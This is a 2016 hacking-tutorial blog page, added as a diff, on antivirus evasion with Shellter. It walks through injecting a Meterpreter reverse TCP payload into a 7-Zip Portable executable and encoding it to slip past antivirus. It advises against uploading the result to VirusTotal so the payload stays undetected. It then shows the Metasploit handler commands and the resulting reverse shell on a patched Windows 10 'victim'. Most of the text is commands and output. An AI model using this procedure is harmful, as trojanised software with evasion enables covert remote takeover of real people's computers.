@@ -1,0 +1,136 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="main.css" type="text/css" />
+<link rel="stylesheet" href="blog.css" type="text/css" />
+<link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
+<title>m3t4lk3y &mdash; Posts tagged "av-evasion"</title>
+</head><body>
+<div id="divbodyholder">
+<div class="headerholder"><div class="header">
+<div id="title">
+<h1 class="nomargin"><a class="ablack" href="https://metalkey.net/index.html">m3t4lk3y</a></h1>
+<div id="description">Hacking tutorials + info</div>
+</div></div></div>
+<div id="divbody"><div class="content">
+<h3><a class="ablack" href="shellter---the-ultimate-tool-for-av-evasion.html">
+Shellter – The ultimate tool for AV evasion
+</a></h3>
+<!-- bashblog_timestamp: #201607011527.49# -->
+<div class="subtitle">July 01, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+<p>Shellter Website - <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a><br>
+<br>
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Windows 10 (fully patched, fully updated antivirus)</p>
+
+<h2>Introduction</h2>
+
+<p>Shellter is a tool for injecting dynamic shellcode into win32 exe’s. The shellcode can be yours, or something you generate via a 3rd party framework such as Metasploit.<br>
+Shellter preserves the original structure of the target executable and can be used in either Automatic or Manual mode. It can also be used to create encoded/self-decrypting payloads.<br>
+<br>
+In this tutorial, we will cover the automatic mode of operation.<br></p>
+
+<h2>Installation</h2>
+
+<p>You can either download and install Shellter from the Shellter Website or install using apt-get in Kali:
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>apt-get update && apt-get install shellter</com>
+</div>
+
+<p></code></p>
+
+<h2>Payload Creation</h2>
+
+<p>Start shellter and select [A] for automatic mode, then select your target .exe file.
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>shellter</com><br>
+Choose Operation Mode - Auto/Manual (A/M/H): <com>A</com><br>
+PE Target: <com>/root/Downloads/7-ZipPortable.exe</com>
+</div>
+
+<p></code>
+On the payload menu, select [L] then [1] for Meterpreter<em>Reverse</em>TCP.<br>
+Enter your IP address and port you wish to use the payload on.<br>
+Note: If you select Stealth Mode, you must set [exitfunc] to [thread] in Metasploit.
+<code></p>
+
+<div class="code">
+************<br>
+* Payloads *<br>
+************<br>
+<br>
+[1] Meterpreter_Reverse_TCP<br>
+[2] Meterpreter_Reverse_HTTP<br>
+[3] Meterpreter_Reverse_HTTPS<br>
+[4] Meterpreter_Bind_TCP<br>
+[5] Shell_Reverse_TCP<br>
+[6] Shell_Bind_TCP<br>
+[7] WinExec<br>
+<br>
+Use a listed payload or custom? (L/C/H): <com>L</com><br>
+Select payload by index: <com>1</com><br>
+SET LHOST: <com>192.168.1.162</com><br>
+SET LPORT: <com>4321</com>
+</div>
+
+<p></code>
+Shellter will now encode and obfuscate the payload.<br>
+When the process is complete, hit [Enter] to exit.<br>
+<br>
+At this point you can either use the checkvt script from Veil Evasion (<a href="https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/">https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/</a>) or Mubix’s vt-notify script (<a href="https://github.com/mubix/vt-notify">https://github.com/mubix/vt-notify</a>) to safely check the payload against Virus Total. Alternatively, use the virus scanner of your target system to confirm the payload is undetectable. DO NOT upload your exe to Virus Total.</p>
+
+<h2>Exploitation</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>msfconsole</com><br>
+msf > <com>use exploit/multi/handler</com><br>
+msf exploit(handler) > <com>set payload windows/meterpreter/reverse_tcp</com><br>
+msf exploit(handler) > <com>set lhost 192.168.1.162</com><br>
+msf exploit(handler) > <com>set lport 4321</com><br>
+msf exploit(handler) > <com>exploit</com>
+</div>
+
+<p></code>
+Run the payload on your Victim machine
+<code></p>
+
+<div class="code">
+C:\7-ZipPortable><com>7-ZipPortable.exe</com>
+</div>
+
+<p></code>
+Back in Kali, a Meterpreter session will open and you now have a reverse shell to your victim Windows 10 machine.
+<code></p>
+
+<div class="code">
+[*] Meterpreter session 1 opened (192.168.1.162:4321 -> 192.168.1.11:49627) at 2015-10-05 00:39:33 +1100<br>
+<br>
+meterpreter > <com>shell</com><br>
+Process 3788 created.<br>
+Channel 1 created.<br>
+Microsoft Windows [Version 10.0.10240]<br>
+(c) 2015 Microsoft Corporation. All rights reserved.<br>
+<br>
+C:\7-ZipPortable> 
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
+<!-- text end -->
+</div>
+<div id="footer">CC by-nc-nd <a href="https://twitter.com/m3t4lk3y">metalkey</a> &mdash; <a href="mailto:"></a><br/>
+Generated with <a href="https://github.com/cfenollosa/bashblog">bashblog</a>, a single bash script to easily create blogs like this one</div>
+</div></div>
+</body></html>
